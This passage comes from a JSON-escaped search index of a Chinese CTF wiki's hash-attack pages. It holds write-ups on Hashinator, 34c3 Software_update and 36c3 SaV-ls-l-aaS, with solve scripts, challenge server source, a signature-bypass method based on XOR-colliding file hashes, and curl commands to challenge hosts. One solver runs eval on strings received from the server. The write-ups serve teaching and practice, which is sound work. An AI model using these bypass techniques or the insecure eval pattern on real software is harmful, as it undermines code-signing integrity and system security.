\uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684 password \u3002","title":"Hashinator"},{"location":"crypto/hash/attack/#_6","text":"\u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a md5 \uff0c sha1 \uff0c blake \uff0c scrypt \u3002 \u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) 1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece rockyou.txt \u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a password \uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002 2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684 password \u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 128 - len(password) \u7684 salt \u3002 3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002 4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684 password \u3001 salt \u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684 password_hash \u3002 \u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002 \u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230 generate_salt() \u51fd\u6570\u4e2d\uff0c salt \u548c password \u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86 msize = 128 # f-you hashcat :D so\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002 \u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b calculate_hash() \u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a 1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002 2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002 3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002 4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230 interim_salt \u548c interim_hash \u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002 5. interim_salt \u548c interim_hash \u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002 \u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b interim_salt \u548c interim_hash \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002 interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) \u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 interim\\_hash_1 interim\\_hash_1 \u548c interim\\_salt_3 interim\\_salt_3 \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa interim\\_hash_2 interim\\_hash_2 \u7684\u503c\uff0c\u800c interim\\_hash_2 interim\\_hash_2 \u5219\u662f\u4e0a\u4e00\u8f6e\u7684 interim_hash \u3002 \u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684 password \u548c salt \u3002 \u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a import os import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket(family=socket.AF_INET) # io.connect(('47.88.216.38', 20013)) io = remote ( '47.88.216.38' , 20013 ) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \" {} (in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \" {} (in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main ()","title":"\u5206\u6790"},{"location":"crypto/hash/attack/#hash_1","text":"import os import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand >> 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"\u539fhash\u7b97\u6cd5"},{"location":"crypto/hash/complex/","text":"\u7efc\u5408\u9898\u76ee \u00b6 2017 34c3 Software_update \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e \u5f02\u6216 \u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002 \u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def \u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002 \u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528 \u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c \uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b \u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002 \u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002 \u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002 \u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ \u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 exp.py \u3002 \u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa !!!!come here!!!! \u5b57\u773c\uff0c\u5982\u4e0b \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully. \u53c2\u8003\u6587\u732e https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py 2019 36c3 SaV-ls-l-aaS \u00b6 \u8fd9\u4e2a\u9898\u7684\u5206\u7c7b\u662f Crypto&Web\uff0c\u634b\u4e00\u4e0b\u6d41\u7a0b\uff1a 60601\u7aef\u53e3\u5f00\u7740\u4e00\u4e2aWeb\u670d\u52a1\uff0c\u9898\u76ee\u63cf\u8ff0\u7ed9\u4e86\u8fde\u63a5\u65b9\u6cd5\uff1a url = 'http://78.47.240.226:60601' && ip = $( curl -s \" $url /ip\" ) && sig = $( curl -s -d \"cmd=ls -l&ip= $ip \" \" $url /sign\" ) && curl --data-urlencode \"signature= $sig \" \" $url /exec\" \u53ef\u4ee5\u770b\u5230\uff0c\u5148\u662f\u8bbf\u95ee /ip \u5f97\u5230 ip\uff0c\u518d\u5411 /sign post \u8fc7\u53bb ip \u548c\u6211\u4eec\u8981\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5f97\u5230\u7b7e\u540d\uff0c\u6700\u540e\u5411 /exec post signature \u6765\u6267\u884c\u547d\u4ee4\u3002\u6211\u4eec\u6267\u884c\u8fd9\u4e00\u884c\u53ef\u4ee5\u53d1\u73b0\u56de\u663e\u4e86 ls -l \u6267\u884c\u7684\u7ed3\u679c\uff0c\u53d1\u73b0\u6709\u4e2a flag.txt\u3002 \u770b\u6e90\u7801\uff0cWeb \u670d\u52a1\u662f\u7531 go \u8d77\u7684\uff1a package main import ( \"bytes\" \"crypto/sha1\" \"encoding/json\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"net\" \"net/http\" \"strings\" \"time\" ) func main () { m := http . NewServeMux () m . HandleFunc ( \"/ip\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } fmt . Fprint ( w , ip ) }) m . HandleFunc ( \"/sign\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } remoteAddr := net . ParseIP ( ip ) if remoteAddr == nil { return } ip = r . PostFormValue ( \"ip\" ) signIP := net . ParseIP ( ip ) if signIP == nil || ! signIP . Equal ( remoteAddr ) { fmt . Fprintln ( w , \"lol, not ip :>\" ) return } cmd := r . PostFormValue ( \"cmd\" ) if cmd != \"ls -l\" { fmt . Fprintln ( w , \"lol, nope :>\" ) return } msg := ip + \"|\" + cmd digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( string ( digest [:])) if err != nil { return } resp , err := http . Post ( \"http://127.0.0.1/index.php?action=sign\" , \"application/json; charset=utf-8\" , b ) if err != nil || resp . StatusCode != 200 { fmt . Fprintln ( w , \"oops, hsm is down\" ) return } body , err := ioutil . ReadAll ( resp . Body ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is bodyless?\" ) return } var signature string err = json . Unmarshal ( body , & signature ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is jsonless?\" ) return } fmt . Fprint ( w , signature + msg ) }) m . HandleFunc ( \"/exec\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } remoteAddr := net . ParseIP ( ip ) if remoteAddr == nil { return } signature := r . PostFormValue ( \"signature\" ) digest := sha1 . Sum ([] byte ( signature [ 172 :])) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( signature [: 172 ] + string ( digest [:])) if err != nil { fmt . Fprintln ( w , \"oops, json encode\" ) return } resp , err := http . Post ( \"http://127.0.0.1/index.php?action=verify\" , \"application/json; charset=utf-8\" , b ) if err != nil || resp . StatusCode != 200 { fmt . Fprintln ( w , \"oops, hsm is down?\" ) return } body , err := ioutil . ReadAll ( resp . Body ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is bodyless?\" ) return } var valid bool err = json . Unmarshal ( body , & valid ) if err != nil { fmt . Fprintln ( w , \"oops, json unmarshal\" ) return } if valid { t := strings . Split ( signature [ 172 :], \"|\" ) if len ( t ) != 2 { fmt . Fprintln ( w , \"oops, split\" ) } signIP := net . ParseIP ( t [ 0 ]) if signIP == nil || ! signIP . Equal ( remoteAddr ) { fmt . Fprintln ( w , \"lol, not ip :>\" ) return } conn , err := net . DialTimeout ( \"tcp\" , \"127.0.0.1:1024\" , 1 * time . Second ) if err != nil { fmt . Fprintln ( w , \"oops, dial\" ) return } fmt . Fprintf ( conn , t [ 1 ] + \"\\n\" ) conn .( * net . TCPConn ). CloseWrite () io . Copy ( w , conn ) } }) s := & http . Server { Addr : \":60601\" , Handler : m , ReadTimeout : 5 * time . Second , WriteTimeout : 5 * time . Second , MaxHeaderBytes : 1 << 20 , } log . Fatal ( s . ListenAndServe ()) } \u4ee3\u7801\u5f88\u5bb9\u6613\u770b\uff0c\u9650\u5236\u4e86 cmd \u53ea\u80fd\u662f ls -l \uff0c\u5176\u4f59\u4e0d\u7ed9\u7b7e\u540d\uff0c\u770b\u6837\u5b50\u6211\u4eec\u662f\u8981\u4f2a\u9020\u5176\u4ed6\u547d\u4ee4\u7684\u7b7e\u540d\u6765\u8bfbflag\uff0c\u8fd9\u91cc\u6ce8\u610f\u5230\u7b7e\u540d\u548c\u9a8c\u7b7e\u7684\u8fc7\u7a0b\u662f\u4f20\u7ed9\u672c\u5730\u8d77\u7684\u4e00\u4e2a php \u6765\u5b8c\u6210\u7684\uff0c\u770b\u4e00\u4e0b\u8fd9\u90e8\u5206\u6e90\u7801\uff1a <?php define ( 'ALGO' , 'md5WithRSAEncryption' ); $d = json_decode ( file_get_contents ( 'php://input' ), JSON_THROW_ON_ERROR ); if ( $_GET [ 'action' ] === 'sign' ){ $pkeyid = openssl_pkey_get_private ( \"file:///var/www/private_key.pem\" ); openssl_sign ( $d , $signature , $pkeyid , ALGO ); echo json_encode ( base64_encode ( $signature )); openssl_free_key ( $pkeyid ); } elseif ( $_GET [ 'action' ] === 'verify' ) { $pkeyid = openssl_pkey_get_public ( \"file:///var/www/public_key.pem\" ); echo json_encode ( openssl_verify ( substr ( $d , 172 ), base64_decode ( substr ( $d , 0 , 172 )), $pkeyid , ALGO ) === 1 ); openssl_free_key ( $pkeyid ); } \u91c7\u7528\u7684\u662f md5WithRSAEncryption \u7684\u65b9\u5f0f\u7b7e\u540d\uff0c\u672c\u5730\u8bd5\u4e86\u4e00\u4e0b\uff0c\u662f\u628a\u6211\u4eec\u4f20\u5165\u7684 $d md5 \u540e\u8f6c\u4e3ahex\uff0c\u586b\u5145\u5230 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410 \u540e\u9762\uff0c\u7ec4\u6210\u6570\u5b57\u7136\u540e\u7528RSA\u7b7e\u540d\u3002 \u770b\u6837\u5b50\u6574\u4e2a\u903b\u8f91\u627e\u4e0d\u5230\u4e00\u70b9\u95ee\u9898\uff0c\u7528\u7684\u90fd\u662f\u6807\u51c6\u5e93\uff0c\u57fa\u672c\u65e0\u6cd5\u653b\u51fb\u3002\u6709\u4e2a\u601d\u8def\u662f\u901a\u8fc7\u4ee3\u7406\u66f4\u6362 ip\uff0c\u53ef\u4ee5\u62ff\u5230\u4e24\u4e2a ip|ls -l \u7684\u7b7e\u540d\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u62e5\u6709\u4e86\u4e24\u7ec4 RSA \u7684 m \u548c c\uff0c\u56e0\u4e3a\u9898\u76ee\u7ed9\u4e86 dockerfile \u7ed9\u4e86\u751f\u6210\u516c\u79c1\u94a5\u7684\u65b9\u6cd5\uff0c\u4f7f\u7528 openssl \u9ed8\u8ba4\u751f\u6210\uff0ce\u4e3a65537\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6c42\u516c\u56e0\u6570\u7684\u65b9\u5f0f\u6765\u6c42\u51fa n\u3002 \u5728\u5f97\u5230\u4e24\u7ec4\u7b7e\u540d\u540e\uff0c\u6211\u4eec\u8981\u5f97\u5230 RSA \u7684m\uff0c\u5c31\u662f\u586b\u5145\u540e\u7684\u6570\uff0c\u6240\u4ee5\u6309\u7167\u4ee3\u7801\u903b\u8f91\uff0c\u5728 go \u91cc\u9762\u5148\u662f sha1: msg := ip + \"|\" + cmd digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( string ( digest [:])) \u518d php \u91cc\u7684 md5\uff0c\u5f97\u5230\u4e24\u7ec4 m \u548c c\uff0c\u4f46\u662f\u603b\u662f\u6c42\u4e0d\u51fa\u516c\u56e0\u6570 n\uff0c\u6000\u7591\u6c42\u7684 m \u4e0d\u5bf9\u3002\u770b\u4ee3\u7801\u53d1\u73b0 go \u91cc\u628a sha1\u7684\u7ed3\u679c\u7528 json \u7f16\u7801\uff0c\u7136\u540e\u4f20\u5230 php\u91cc json \u89e3\u7801\u3002\u8fd9\u90e8\u5206\u975e\u5e38\u53ef\u7591\uff0c\u4e3a\u4f55\u8981\u7528 json \u7f16\u7801\uff08\u7528 hex \u4f20\u8fc7\u53bb\u5b83\u4e0d\u9999\u4e48\uff09\uff0c\u672c\u5730\u642d\u4e00\u4e0b\u73af\u5883\u8ddf\u4e00\u4e0b\u3002\uff08\u9898\u76ee\u7ed9\u4e86dockerfile\uff09 \u8d77\u4e2adocker\uff0c\u6539\u4e00\u4e0b index.php\uff0c\u52a0\u4e00\u4e2a var_dump($d); \uff0c\u518d\u6539\u4e00\u4e0b go\uff0c\u8fd4\u56de\u4e00\u4e0b php \u7684\u7ed3\u679c\uff1a fmt . Fprintln ( w , string ( body )) \u73b0\u5728\u8ba9\u7a0b\u5e8f\u7b7e\u540d\uff0c\u8fd4\u56de\u7ed3\u679c\uff1a string(38) \"\u000e \u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\" \"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\" oops, hsm is jsonless? $d \u7adf\u7136\u662f\u957f\u5ea6\u4e3a 38 \u7684\u5b57\u7b26\u4e32\uff0c\u770b\u6765\u679c\u7136\u662f\u8fd9\u91cc\u7f16\u7801\u6709\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u770b\u4e00\u4e0b\u6bcf\u4e2a\u6b65\u9aa4\u7684\u7ed3\u679c\uff0c\u5148\u770b\u4e00\u4e0b go \u91cc json\u7f16\u7801\u540e\u7684 sha1 \u7ed3\u679c\u662f\u4ec0\u4e48\uff1a package main import ( \"bytes\" \"crypto/sha1\" \"encoding/json\" \"fmt\" ) func main () { msg := \"172.17.0.1|ls -l\" digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) json . NewEncoder ( b ). Encode ( string ( digest [:])) fmt . Print ( string ( b . Bytes ())); } \u8fd0\u884c\u4e00\u4e0b\uff1a \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" \u548c\u6b63\u5e38\u7684sha1\u7684\u7ed3\u679c\u6765\u6bd4\u8f83\u4e00\u4e0b\uff1a Python 2 .7.16 ( default, Sep 2 2019 , 11 :59:44 ) [ GCC 4 .2.1 Compatible Apple LLVM 10 .0.1 ( clang-1001.0.46.4 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information. >>> \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" 